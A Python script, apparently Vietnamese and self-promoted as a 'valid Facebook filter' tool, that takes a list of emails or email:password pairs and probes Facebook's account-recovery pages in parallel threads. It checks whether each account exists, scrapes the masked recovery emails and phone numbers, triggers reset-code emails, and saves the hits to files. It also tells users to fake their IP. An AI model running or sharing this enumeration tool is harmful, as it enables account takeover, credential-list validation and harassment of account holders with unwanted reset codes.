import requests, re
from requests import Session
import threading
import os, sys
from pystyle import *
#màu
luc = "\033[1;32m"
trang = "\033[1;37m"
do = "\033[1;31m"
vang = "\033[0;93m"
hong = "\033[1;35m"
xduong = "\033[1;34m"
lam = "\033[1;36m"
red='\u001b[31;1m'
yellow='\u001b[33;1m'
green='\u001b[32;1m'
blue='\u001b[34;1m'
tim='\033[1;35m'
xanhlam='\033[1;36m'
xam='\033[1;30m'
black='\033[1;19m'
class Linkedmfb():
    def __init__(self):
        self.session = requests.Session()
        self.params_loc_lk = {
        'ctx': 'recover',
        'c': '/login/',
        'search_attempts': '1',
        'alternate_search': '1',
        'show_friend_search_filtered_list': '0',
        'birth_month_search': '0',
        'city_search': '0',
        }
        self.headers_scan = {
        'authority': 'm.facebook.com',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'vi-VN,vi;q=0.9,zh-CN;q=0.8,zh;q=0.7,en-AU;q=0.6,en;q=0.5,fr-FR;q=0.4,fr;q=0.3,en-US;q=0.2',
        'cache-control': 'max-age=0',
        # 'cookie': 'datr=Pe69ZDN85gWKB23Ja3Ml2WPe; sb=Pe69ZMTthAC-eKHoF0UZNcA_; sfiu=AYiOngaTA4gJDYvGe7Exdq_GfPF0uMehPbLgKb3diRqHXwFXYZQa4pXg40HtWqLo1JvlJ3XQ1qFj3mrFr2qPbFy2W4Z50gZcHWGH6LxwF3kbSHjQgKX0NfjssAC6mJV3pMn7nf29Jfr0OgcPSeo2xjeEzud1PeFbJIIPS_leFkkrDp04h_mcsTJE2wgKlfFOWoWEx5XlgRLR5Y9VaBwsptoocI_jtTW20gVfGgXCgdYSDg; m_pixel_ratio=1.875; wd=384x759; fr=0OwCiuyPmvMbKHYRm..Bkvkb8.LB.AAA.0.0.Bkvn6S.AWV2h5U55Ek',
        'sec-ch-prefers-color-scheme': 'light',
        'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
        'sec-ch-ua-full-version-list': '"Not:A-Brand";v="99.0.0.0", "Chromium";v="112.0.5615.133"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-ch-ua-platform-version': '"12.0.0"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'none',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',
        }
        self.params_scan = {
        'c': '/login/',
        'fl': 'initiate_view',
        'ctx': 'msite_initiate_view',
        }
        self.headers_code = {
        'authority': 'm.facebook.com',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'vi-VN,vi;q=0.9,zh-CN;q=0.8,zh;q=0.7,en-AU;q=0.6,en;q=0.5,fr-FR;q=0.4,fr;q=0.3,en-US;q=0.2',
        # 'cookie': 'datr=Pe69ZDN85gWKB23Ja3Ml2WPe; sb=Pe69ZMTthAC-eKHoF0UZNcA_; m_pixel_ratio=1.875; sfiu=AYjBGxf3aFNQ6T8tL5sKVMc_n9-E-mu6b2tGhuA-rP9NfJ-viYgVBFTXboshX2vhVNcTjjjcNfP2PRs166nW0mH0mJGw1U0zuhHkLo3MZ-5wztAz7Sg2HG-NbLgR9BKy8lLAKpD11-bmk6JYcTA6bGciVIDUTPRtQH6n703hk0CbjMmKhMgnVSHTFJAqW9dsYIvXvGSz-KcHtoJXigrrvatC; wd=384x759; fr=0OwCiuyPmvMbKHYRm..Bkvkb8.LB.AAA.0.0.Bkvpmp.AWXQIhqfSPA',
        'sec-ch-prefers-color-scheme': 'light',
        'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
        'sec-ch-ua-full-version-list': '"Not:A-Brand";v="99.0.0.0", "Chromium";v="112.0.5615.133"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-ch-ua-platform-version': '"12.0.0"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'none',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',
        'viewport-width': '980',
        }
    def check(self, data, luu_code6, luu_code8):
        #tự thêm proxy:v
        check_data = data.split(':')
        if len(check_data) == 1:
            email = check_data[0]
            password = None
        elif len(check_data) == 2:
            email = check_data[0]
            password = check_data[1]
        else:
            print("Invalid Email Bro!?")
            return
        while True:
            try:
                self.headers_get_ck_nha ={
                'Accept': '*/*',
                'Pragma': 'no-cache',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko',
                }
                a = self.session.get('https://m.facebook.com/login/identify/?ctx=recover&search_attempts=0&alternate_search=0&toggle_search_mode=1', headers = self.headers_get_ck_nha)
                cookie = a.cookies.get('datr')
                get_data = a.text
                lsd = get_data.split('"lsd" value="')[1].split('"')[0]
                jazoest = get_data.split('"jazoest" value="')[1].split('"')[0]
                self.cookies_lk = {
                'datr': cookie,
                'sb': 'V-DEZIhp4eBSFrAMruWO1UE_',
                'locale': 'vi_VN',
                'm_pixel_ratio': '1.875',
                'wd': '384x759',
                'fr': '0hCppYSAhUnShZCxG..Bkw01-.ki.AAA.0.0.Bkx9Ku.AWWKxh0Wc6o',
                }
                self.headers_loc_lk = {
                'authority': 'm.facebook.com',
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'accept-language': 'vi-VN,vi;q=0.9,zh-CN;q=0.8,zh;q=0.7,en-AU;q=0.6,en;q=0.5,fr-FR;q=0.4,fr;q=0.3,en-US;q=0.2',
                'cache-control': 'max-age=0',
                'content-type': 'application/x-www-form-urlencoded',
                #'cookie': f'datr={cookie}',
                'origin': 'https://m.facebook.com',
                'referer': 'https://m.facebook.com/login/identify/?ctx=recover&search_attempts=0&alternate_search=0&toggle_search_mode=1',
                'sec-ch-prefers-color-scheme': 'light',
                'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
                'sec-ch-ua-full-version-list': '"Not:A-Brand";v="99.0.0.0", "Chromium";v="112.0.5615.133"',
                'sec-ch-ua-mobile': '?1',
                'sec-ch-ua-platform': '"Android"',
                'sec-ch-ua-platform-version': '"12.0.0"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-user': '?1',
                'upgrade-insecure-requests': '1',
                'user-agent': 'Mozilla/5.0 (Linux; Android 12; SM-A037F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
                }
                self.data = {
                'lsd': lsd,
                'jazoest': jazoest,
                'email': email,
                'did_submit': 'Tìm kiếm',
                }
                response = requests.post('https://m.facebook.com/login/identify/', params = self.params_loc_lk, headers = self.headers_loc_lk, data = self.data, cookies = self.cookies_lk)
                if 'Số điện thoại hoặc email bạn nhập không khớp với tài khoản nào.' in response.text:
                    if password is not None:
                        print(f"{email}:{password} | Không Liên Kết | Send Code = []")
                    else:
                        print(f"{email} | Không Liên Kết | Send Code = []")
                elif 'Nhập mật khẩu để đăng nhập' in response.text:
                    get_cookie = response.cookies
                    datr = get_cookie.get('datr')
                    fr = get_cookie.get('fr')
                    sfiu = get_cookie.get('sfiu')
                    self.cookies = {
                    'datr': datr,
                    'sb': 'Pe69ZMTthAC-eKHoF0UZNcA_',
                    'sfiu': sfiu,
                    'm_pixel_ratio': '1.875',
                    'wd': '384x759',
                    'fr': fr,
                    }
                    response1 = requests.get('https://m.facebook.com/recover/initiate/', params = self.params_scan, cookies = self.cookies, headers = self.headers_scan).text
                    check_email = re.findall(r'"_52jc _52j9">([\w\*]+&#064;[^\s<]+)', response1)
                    total_email = len(check_email)
                    email_scan = str(check_email).replace("'", "").replace(',', ' +').replace('&#064;', '@')
                    check_sms = re.findall(r'Gửi mã qua SMS</div><div class="_52jc _52j9">([^"]*)</div></label></div></div><div', response1)
                    sms = str(check_sms).replace("'", "").replace(',', ' &')
                    total_sms = len(check_sms)
                    response2 = requests.get('https://m.facebook.com/recover/code/?em%5B0%5D=%3CUSER%3E&rm=send_email&c=%2Flogin%2F&hash=AUYVAkd_ePKMY6tTiIo&locale=vi_VN&_rdr',cookies = self.cookies,headers = self.headers_code).text
                    if 'Vui lòng kiểm tra mã trong email của bạn. Mã này gồm 6 số.' in response2:
                        if not f'Gửi mã qua email</div><div class="_52jc _52j9">{email.replace("@", "&#064;")}' in response1:
                            if password is not None:
                                print(f"{email}:{pasword} | Liên Kết Ảo | Send Code = Email {email_scan} | Sms = {sms} | Code = [6]")
                            else:
                                print(f"{email} | Liên Kết Ảo | Send Code = Email {email_scan} | Sms = {sms} | Code = [6]")
                        else:
                            if password is not None:
                                print(f"{email}:{password} | Số Liên Kết = {total_email + total_sms} | Send Code = Email {email_scan} | Sms = {sms} | Code = [6]")
                                open(luu_code6, "a+").write(f"{email}:{password} | Số Liên Kết = {total_email + total_sms} | Send Code = Email {email_scan} | Sms = {sms} | Code = [6]" + "\n")
                            else:
                                print(f"{email} | Số Liên Kết = {total_email + total_sms} | Send Code = Email {email_scan} | Sms = {sms} | Code = [6]")
                                open(luu_code6, "a+").write(f"{email} | Số Liên Kết = {total_email + total_sms} | Send Code = Email {email_scan} | Sms = {sms} | Code = [6]" + "\n")
                    elif 'Vui lòng kiểm tra mã trong email của bạn. Mã này gồm 8 số.' in response2:
                        if not f'Gửi mã qua email</div><div class="_52jc _52j9">{email.replace("@", "&#064;")}' in response1:
                            if password is not None:
                                print(f"{email}:{password} | Liên Kết Ảo | Send Code = Email {email_scan} | Sms = {sms} | Code = [8]")
                            else:
                                print(f"{email} | Liên Kết Ảo | Send Code = Email {email_scan} | Sms = {sms} | Code = [8]")
                        else:
                            if password is not None:
                                print(f"{email}:{password} | Số Liên Kết = {total_email + total_sms} | Send Code = Email {email_scan} | Sms = {sms} | Code = [8]")
                                open(luu_code8, "a+").write(f"{email}:{password} | Số Liên Kết = {total_email + total_sms} | Send Code = Email {email_scan} | Sms = {sms} | Code = [8]" + "\n")
                            else:
                                print(f"{email} | Số Liên Kết = {total_email + total_sms} | Send Code = Email {email_scan} | Sms = {sms} | Code = [8]")
                                open(luu_code8, "a+").write(f"{email} | Số Liên Kết = {total_email + total_sms} | Send Code = Email {email_scan} | Sms = {sms} | Code = [8]" + "\n")
                elif 'Chúng tôi không tìm thấy tài khoản khớp với nội dung bạn nhập, nhưng có một tài khoản gần khớp.' in response.text:
                    get_cookie = response.cookies
                    datr = get_cookie.get('datr')
                    fr = get_cookie.get('fr')
                    sfiu = get_cookie.get('sfiu')
                    self.cookies = {
                    'datr': datr,
                    'sb': 'Pe69ZMTthAC-eKHoF0UZNcA_',
                    'sfiu': sfiu,
                    'm_pixel_ratio': '1.875',
                    'wd': '384x759',
                    'fr': fr,
                    }
                    response1 = requests.get('https://m.facebook.com/recover/initiate/', params = self.params_scan, cookies = self.cookies, headers = self.headers_scan).text
                    check_email = re.findall(r'"_52jc _52j9">([\w\*]+&#064;[^\s<]+)', response1)
                    email_scan = str(check_email).replace("'", "").replace(',', ' +').replace('&#064;', '@')
                    check_sms = re.findall(r'Gửi mã qua SMS</div><div class="_52jc _52j9">([^"]*)</div></label></div></div><div', response1)
                    sms = str(check_sms).replace("'", "").replace(',', ' &')
                    response2 = requests.get('https://m.facebook.com/recover/code/?em%5B0%5D=%3CUSER%3E&rm=send_email&c=%2Flogin%2F&hash=AUYVAkd_ePKMY6tTiIo&locale=vi_VN&_rdr',cookies = self.cookies, headers = self.headers_code,).text
                    if 'Vui lòng kiểm tra mã trong email của bạn. Mã này gồm 6 số.' in response2:
                        if password is not None:
                            print(f"{email}:{password} | Liên Kết Ảo | Send Code = Email {email_scan} | Sms = {sms} | Code = [6]")
                        else:
                            print(f"{email} | Liên Kết Ảo | Send Code = Email {email_scan} | Sms = {sms} | Code = [6]")
                    elif 'Vui lòng kiểm tra mã trong email của bạn. Mã này gồm 8 số.' in response2:
                        if password is not None:
                            print(f"{email}:{password} | Liên Kết Ảo | Send Code = Email {email_scan} | Sms = {sms} | Code = [8]")
                        else:
                            print(f"{email} | Liên Kết Ảo | Send Code = Email {email_scan} | Sms = {sms} | Code = [8]")
                elif 'Tài khoản đã bị khóa' in response.text:
                    if password is not None:
                        print(f"{email}:{password} | FAQ | Send Code = []")
                    else:
                        print(f"{email} | FAQ | Send Code = []")
                elif ('Không thể xử lý yêu cầu của bạn' in response.text) or ('Đã xảy ra lỗi với yêu cầu này. Chúng tôi đang cố gắng sửa lỗi sớm nhất có thể.' in response.text):
                    if password is not None:
                        print(f"{email}:{password} | ERROR | Send Code = []")
                    else:
                        print(f"{email} | ERROR | Send Code = []")
                    Linkedmfb().check(data, luu_code6, luu_code8)
                elif 'Hãy thử nhập mật khẩu của bạn' in response.text:
                    if password is not None:
                        print(f"{email}:{password} | Liên Kết Ảo | Send Code = []")
                    else:
                        print(f"{email} | Liên Kết Ảo | Send Code = []")
                else:
                    print(response.text)
                    if password is not None:
                        print(f"{email}:{password} | BAN | Send Code = []")
                    else:
                        print(f"{email} | BAN | Send Code = []")
                    Linkedmfb().check(data, luu_code6, luu_code8)
                    
                break
            except Exception as e:
                #print(str(e))
                if password is not None:
                    print(f"{email}:{password} | RETRY | Send Code = []")
                else:
                    print(f"{email} | RETRY | Send Code = []")
                continue

def logo():
    os.system('cls' if os.system == 'nt' else 'clear')
print(f"{lam}Bản Không Proxy Ae Chú Ý Fake Ip Nha")
print(f"{lam}Nếu Không Nhập File Lưu, Sẽ Có Lỗi Xảy Ra")
print(f"{lam}Bản m.facebook.com")
file_path = os.path.abspath(__file__)
while True:
    try:
        print("""
            \033[1;36m╭─⋞─────────────────────────────────────────────────────╮
            \033[1;31m███╗   ██╗ █████╗ ███╗   ███╗    ██████  ███████╗██╗   ██╗          
            \033[1;32m████╗  ██║██╔══██╗████╗ ████║    ██╔══██╗██╔════╝██║   ██║          
            \033[1;33m██╔██╗ ██║███████║██╔████╔██║    ██║  ██║█████╗  ╚██╗ ██╔╝          
            \033[1;34m██║╚██╗██║██╔══██║██║╚██╔╝██║    ██║  ██║██╔══╝   ╚████╔╝           
            \033[1;35m██║ ╚████║██║  ██║██║ ╚═╝ ██║    ██████╔╝███████╗  ╚██╔╝            
            \033[1;36m╚═╝  ╚═══╝╚═╝  ╚═╝╚═╝     ╚═╝    ╚═════╝ ╚══════╝   ╚═╝   
            \033[1;34m Youtube : \033[1;37mhttps://youtube.com/@NamTool1
            \033[1;34m Nhóm Zalo : \033[1;37mhttps://zalo.me/g/kfmgqm225
            \033[1;34m Facebook   : \033[1;37mhttps://facebook.com/nam.nhn131 
            \033[1;36m╰─────────────────────────────────────────────────────⋟─╯ 
            \033[1;31m    TOOL LỌC VALID FACEBOOK V4
            \033[1;36m╰─────────────────────────────────────────────────────⋟─╯\n""")
        file_email = input("Nhập File Email: ")
        with open(file_email, "r") as sp:
            ad = sp.read()
        break
    except:
        print(f"""Không Thấy File Trong
{os.path.dirname(file_path)} Bạn Ơi""")
        continue
while True:
    luu_code6 = input("Nhập File Lưu Email Liên Kết Code 6: ")
    luu_code8 = input("Nhập File Lưu Email Liên Kết Code 8: ")
    if luu_code6 == '':
        print("Vui Lòng Nhập File Lưu")
        continue
    elif luu_code8 == '':
        print("Vui Lòng Nhập File Lưu")
        continue
    else:
        break
#prx = input("Nhập File Proxy Https/Http: ")
run = Linkedmfb()
if __name__ == '__main__':
    with open(file_email, "r", encoding = "utf-8") as file:
        threads = []
        for line in file.readlines():
            data = line.strip()
            thread = threading.Thread(target = run.check, args = (data, luu_code6, luu_code8))
            threads.append(thread)
            thread.start()
        for thread in threads:
            thread.join()